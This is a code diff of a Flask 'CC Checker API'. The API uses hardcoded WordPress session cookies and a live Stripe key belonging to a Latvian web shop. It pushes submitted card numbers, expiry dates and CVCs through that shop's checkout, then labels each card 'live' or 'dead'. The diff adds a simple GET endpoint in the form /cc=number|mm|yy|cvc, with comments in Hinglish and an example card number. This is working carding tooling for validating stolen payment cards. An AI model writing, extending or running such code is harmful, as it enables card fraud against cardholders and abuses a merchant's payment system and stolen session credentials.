@@ -1,12 +1,11 @@
 from flask import Flask, request, jsonify
 import requests
 import re
-import json
 import os
 
 app = Flask(__name__)
 
-# EXACT COOKIES - Render environment se load karega
+# EXACT COOKIES
 COOKIES = {
     'wordpress_sec_417153a0f5c2f87ed25ef38d98bb3798': 'usljfjae2q%7C1762849683%7CQMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo%7Cfcc7f214dd3ce843e5685de367f552785729f3c31f8f81dfd09734e768a60625',
     '_ga': 'GA1.1.1745993156.1761639993',
@@ -136,7 +135,7 @@ def get_bin_info(card_number):
 def create_stripe_payment_method(card_data):
     card_number, exp_month, exp_year, cvc = card_data
     
-    stripe_data = f"type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F2ee772a1e3%3B+stripe-js-v3%2F2ee772a1e3%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fe-led.lv&time_on_page=150874&client_attribution_metadata[client_session_id]=3afab764-fb85-4fc8-a752-00b0d33415e7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=3ec638d7-fa58-4943-88ba-3df3e2cadd96&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=5f4b7095-9d5d-4032-bc0c-511afd16336d4ec3ab&muid=588bccab-9133-4397-b3e2-f2785fdd613ca53fc1&sid=df4979dd-7001-409e-881b-4bc937e597948a822d&key=pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20"
+    stripe_data = f"type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F2ee772a1e3%3B+stripe-js-v3%2F2ee772a1e3%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fe-led.lv&time_on_page=150874&client_attribution_metadata[client_session_id]=3afab764-fb85-4fc8-a752-00b0d33415e7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=3ec638d7-fa58-4943-88ba-3df3e2cadd96&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=5f4b7095-9d5d-4032-bc0c-511afd16336d4ec3ab&muid=588bccab-9133-4397-b3e2-f2785fdd613ca53fc1&sid=df4979dd-7001-409e-881b-4bc937e597948a822d&key=pk_live_51Kg8dtBXnyl1N5QY5UDJJCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20"
     
     try:
         response = requests.post(
@@ -205,8 +204,91 @@ def confirm_ajax(pm_id, nonce):
             'error': f'AJAX Exception: {str(e)}'
         }
 
+# 🔥 YEH WO NAYA ENDPOINT HAI JO TU CHAHATA HAI
+@app.route('/cc=<path:cc_data>')
+def check_cc_simple(cc_data):
+    """Simple CC checking endpoint - exactly like your example"""
+    try:
+        # CC data parse karo: number|mm|yy|cvc
+        parts = cc_data.split('|')
+        
+        if len(parts) != 4:
+            return jsonify({
+                "status": "error",
+                "message": "Format: /cc=number|mm|yy|cvc"
+            })
+        
+        card_number, exp_month, exp_year, cvc = parts
+        
+        # Clean card number
+        card_clean = str(card_number).replace(' ', '').replace('-', '')
+        
+        # Luhn Check
+        if not luhn_check(card_clean):
+            return jsonify({
+                "status": "invalid",
+                "message": "Luhn check failed",
+                "card": card_clean[-4:],
+                "bin_info": get_bin_info(card_clean)
+            })
+        
+        # Extract Nonce
+        nonce = extract_nonce()
+        if not nonce:
+            return jsonify({
+                "status": "error",
+                "message": "Cannot extract security nonce"
+            })
+        
+        # Create Stripe Payment Method
+        card_data = [card_clean, exp_month, exp_year, cvc]
+        stripe_result = create_stripe_payment_method(card_data)
+        
+        if not stripe_result['success']:
+            return jsonify({
+                "status": "dead",
+                "message": stripe_result.get('error', 'Payment method creation failed'),
+                "card": card_clean[-4:],
+                "bin_info": get_bin_info(card_clean)
+            })
+        
+        pm_id = stripe_result['pm_id']
+        
+        # Confirm via AJAX
+        ajax_result = confirm_ajax(pm_id, nonce)
+        
+        if ajax_result['success']:
+            if ajax_result.get('result') == 'success':
+                return jsonify({
+                    "status": "live",
+                    "message": "Card is LIVE and valid",
+                    "card": card_clean[-4:],
+                    "bin_info": get_bin_info(card_clean)
+                })
+            else:
+                return jsonify({
+                    "status": "dead", 
+                    "message": ajax_result.get('messages', 'Card declined'),
+                    "card": card_clean[-4:],
+                    "bin_info": get_bin_info(card_clean)
+                })
+        else:
+            return jsonify({
+                "status": "error",
+                "message": ajax_result.get('error', 'Confirmation failed'),
+                "card": card_clean[-4:]
+            })
+            
+    except Exception as e:
+        return jsonify({
+            "status": "error",
+            "message": f"Processing error: {str(e)}"
+        })
+
+# OLD ENDPOINTS BHI RAHENGE
 @app.route('/check', methods=['POST'])
 def check_card():
+    """Original JSON endpoint"""
     try:
         data = request.get_json()
         
@@ -302,18 +384,22 @@ def status():
         'platform': 'Render',
         'nonce_available': bool(nonce),
         'cookies_valid': bool(COOKIES),
-        'message': 'CC Checker API - Hosted on Render'
+        'message': 'CC Checker API - Simple URL Format'
     })
 
 @app.route('/')
 def home():
     return jsonify({
-        'message': 'CC Checker API - Hosted on Render',
+        'message': 'CC Checker API - Simple URL Format',
         'endpoints': {
-            'check': '/check (POST) - Check credit card',
-            'status': '/status (GET) - API status'
+            'simple_check': '/cc=number|mm|yy|cvc (GET)',
+            'json_check': '/check (POST) - JSON data',
+            'status': '/status (GET)'
         },
-        'usage': 'Send POST to /check with JSON: {"card_number": "...", "exp_month": "...", "exp_year": "...", "cvc": "..."}'
+        'examples': {
+            'simple': 'https://your-api.herokuapp.com/cc=4147768578745265|04|2026|168',
+            'json': 'POST /check with JSON body'
+        }
     })
 
 if __name__ == '__main__':
